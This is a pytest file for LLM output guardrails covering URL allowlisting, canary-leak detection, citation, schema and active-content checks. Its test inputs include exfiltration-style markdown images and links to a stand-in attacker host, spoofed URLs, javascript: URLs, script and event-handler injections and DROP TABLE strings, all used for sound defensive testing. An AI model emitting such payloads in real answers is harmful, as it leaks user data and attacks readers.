# path: book/projects/guardrails/tests/test_output.py
from __future__ import annotations

import pytest
from pydantic import BaseModel

from guardrails import (Action, ActiveContentCheck, CanaryCheck, CitationCheck, GuardContext, SchemaCheck, Stage,
                        Subject, UrlAllowlistCheck, escape_html, host_allowed)

HOSTS = ("intranet.northwind.example", "docs.northwind.example")


def out(check, text, ctx):
    return check.evaluate(Subject(Stage.OUTPUT, text=text), ctx)


class Ticket(BaseModel):
    category: str
    priority: int


def test_schema_check(ctx):
    assert out(SchemaCheck(Ticket), '```json\n{"category":"vpn","priority":2}\n```', ctx).action is Action.ALLOW
    assert out(SchemaCheck(Ticket), '{"category":"vpn"}', ctx).action is Action.BLOCK
    assert out(SchemaCheck(Ticket), "not json", ctx).action is Action.BLOCK


def test_schema_check_custom_validator(ctx):
    def no_sql(text):
        if "drop" in text.lower():
            raise ValueError("sql")
    assert out(SchemaCheck(validator=no_sql), "DROP TABLE x", ctx).action is Action.BLOCK


@pytest.mark.parametrize("url,ok", [
    ("https://intranet.northwind.example/a", True),
    ("https://wiki.intranet.northwind.example/a", True),
    ("https://INTRANET.northwind.example./a", True),
    ("https://intranet.northwind.example@collector.attacker.example/p", False),
    ("https://intranet.northwind.example.collector.attacker.example/p", False),
    ("https://evilintranet.northwind.example.attacker.example", False),
    ("javascript:alert(1)", False),
    ("data:image/png;base64,AAAA", False),
    ("ftp://intranet.northwind.example/file", False),
])
def test_host_allowed(url, ok):
    assert host_allowed(url, HOSTS) is ok


def test_url_allowlist_strips_images_and_links(ctx):
    text = ("Answer ![s](https://collector.attacker.example/p.png?d=1) see [here](https://collector.attacker.example/x) "
            "and [vpn](https://intranet.northwind.example/vpn) <img src='https://collector.attacker.example/q'> "
            "raw https://collector.attacker.example/z\n\n[1]: https://collector.attacker.example/r")
    v = out(UrlAllowlistCheck(HOSTS), text, ctx)
    assert v.action is Action.REDACT
    assert "collector.attacker.example" not in (v.redacted or "")
    assert "[vpn](https://intranet.northwind.example/vpn)" in (v.redacted or "")
    assert "here [link removed]" in (v.redacted or "")


def test_url_allowlist_allows_clean_answers(ctx):
    text = "Use the form at https://intranet.northwind.example/hr/leave and ![d](https://docs.northwind.example/d.png)"
    assert out(UrlAllowlistCheck(HOSTS), text, ctx).action is Action.ALLOW


def test_url_allowlist_block_mode(ctx):
    v = out(UrlAllowlistCheck(HOSTS, mode="block"), "[x](https://collector.attacker.example)", ctx)
    assert v.action is Action.BLOCK


def test_canary_check_text_and_tool_args(ctx):
    from aie_core.llm.types import ToolCall
    check = CanaryCheck(["NW-CANARY-abc"])
    assert out(check, "leak NW-CANARY-abc", ctx).action is Action.BLOCK
    call = ToolCall(id="1", name="send_reply", arguments={"body": "x NW-CANARY-abc"})
    assert check.evaluate(Subject(Stage.TOOL, tool_call=call), ctx).action is Action.BLOCK
    assert out(check, "clean", ctx).action is Action.ALLOW


def test_citation_check():
    ctx = GuardContext(tenant="retail", user_id="u", evidence_ids=frozenset({"hr-pto-policy#2", "it-faq#1"}))
    c = CitationCheck()
    assert out(c, "Ten days [hr-pto-policy#2].", ctx).action is Action.ALLOW
    assert out(c, "Ten days.", ctx).action is Action.BLOCK
    assert out(c, "Ten days [hr-secret#9].", ctx).action is Action.BLOCK
    assert out(c, "INSUFFICIENT_EVIDENCE", ctx).action is Action.ALLOW
    # A markdown link is not a citation.
    assert out(c, "See [form](https://intranet.northwind.example).", ctx).action is Action.BLOCK


def test_active_content(ctx):
    c = ActiveContentCheck()
    assert out(c, "<script>fetch('x')</script>", ctx).action is Action.BLOCK
    assert out(c, '<a href="#" onclick="x()">x</a>', ctx).action is Action.BLOCK
    assert out(c, "Run DROP TABLE users;", ctx).action is Action.FLAG
    assert out(c, "Use `rm -rf ./build` in your project folder", ctx).action is Action.ALLOW
    assert out(c, "The script for the town hall is ready", ctx).action is Action.ALLOW


def test_escape_html():
    assert escape_html('<img src=x onerror="a">') == "&lt;img src=x onerror=&quot;a&quot;&gt;"
